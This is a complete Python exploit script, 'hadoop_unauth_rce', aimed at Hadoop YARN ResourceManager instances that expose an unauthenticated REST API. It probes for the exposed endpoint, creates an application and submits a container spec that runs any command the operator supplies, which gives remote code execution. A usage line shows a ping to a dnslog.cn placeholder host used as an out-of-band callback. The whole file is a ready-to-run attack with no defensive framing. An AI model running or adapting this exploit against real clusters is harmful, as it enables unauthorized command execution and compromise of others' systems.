# coding:utf-8
import requests
import sys
import argparse
import json

use_examples = """python hadoop_unauth_rce.py -u http://127.0.0.1:8088 -c "ping -c 1 xxx.dnslog.cn" """
timeout = 15
def check(url):
    print(u"\033[96mStart Check "+url+'\033[0m')
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    }
    try:
        req = requests.get(url+"/cluster/apps/NEW", headers=headers, timeout=timeout, verify=False)
        if req.status_code == 200:
            return True
    except:
        pass
    return False

def attack(url, cmd):
    try:
        print("\033[96mStart Attack "+url+'\033[0m')
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        req = requests.post(url+"/ws/v1/cluster/apps/new-application", data="", headers=headers, timeout=timeout, verify=False)
        app_id = json.loads(req.text)['application-id']
        print("\033[96mapplication-id is : "+app_id+'\033[0m')
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        payload = '{{"am-container-spec":{{"commands":{{"command":"{command}"}}}},"application-id":"{app_id}","application-name":"test","application-type":"YARN"}}'
        payload = payload.format(command=cmd, app_id=app_id)
        req = requests.post(url + "/ws/v1/cluster/apps", data=payload, headers=headers, timeout=timeout, verify=False)
        if req.status_code == 202 and app_id in req.headers['Location']:
            return True
    except:
        pass
    return False


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print(use_examples)
        exit()
    elif len(sys.argv):
        parser = argparse.ArgumentParser(description='hadoop_unauth_rce')
        parser.add_argument("-u", "--url", metavar="URI", required=True, help="Target Url")
        parser.add_argument("-c", "--cmd", metavar="Command", help="Command")
        args = parser.parse_args()

    url = args.url.strip('/')
    if not check(url):
        print("\033[91mNot Found Vul!"+'\033[0m')
        exit()
    if not args.cmd:
        print("\033[91mPlease Input Command"+'\033[0m')
        exit()
    if attack(url, args.cmd):
        print("\033[96mAttack Succeeded!"+'\033[0m')
    else:
        print("\033[91mERROR"+'\033[0m')
